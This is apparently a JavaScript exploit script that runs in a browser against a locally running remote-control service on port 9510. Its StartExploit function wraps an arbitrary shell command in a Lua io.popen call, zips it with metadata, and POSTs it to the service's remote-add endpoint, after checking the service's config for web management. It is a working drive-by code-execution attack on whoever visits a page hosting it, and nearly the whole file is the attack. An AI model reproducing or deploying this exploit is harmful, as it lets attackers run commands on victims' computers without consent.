
// Import module for creating zip files
var script = document.createElement("script");
script.setAttribute('src', 'https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js');
document.head.appendChild(script);

var metapropString = `meta.name: Example Name
meta.author: Example Author
meta.description: Example description
meta.tags: Example`;

const genRanHex = size => [...Array(size)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');

function SendZip(zipname, zipcontent){
    let xhr = new XMLHttpRequest();
    xhr.open("POST","http://localhost:9510/system/remote/add?filename="+zipname+".zip", false);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send(zipcontent);
}

function CreateZip(lua_payload){
    let zip = new JSZip();
    let foldername = genRanHex(10);
    zip.file(foldername+"/meta.prop", metapropString);
    zip.file(foldername+"/remote.lua", lua_payload);
    zip.generateAsync({type: "uint8array", mimeType: "application/octet-stream"}).then(function (generatedZip) {
        SendZip(genRanHex(10), generatedZip)
    });
};

async function Initiator(lua_payload){
    let url = "http://localhost:9510/system/config";
    await fetch(url).then(response => {
        if (response.ok) {
            return response.json();
        }
        }).then(data => {
            if (data.manager.web == true){
                CreateZip(lua_payload);
            }
        }).catch(error => {
            alert(error);
        }
    );
    return false;
}

function StartExploit(typeOfExploit, argument){
    let luaExec = `io.popen('COMMAND');`;
    console.log("Started");
    switch (typeOfExploit){
        case "command":
            var finalscript = luaExec.replace("COMMAND", argument);
            Initiator(finalscript);
            break;
        case "script":
            Initiator(argument);
            break;
        default:
            console.log("argument must be one of the following: [command, script]")
        break;
    }
}

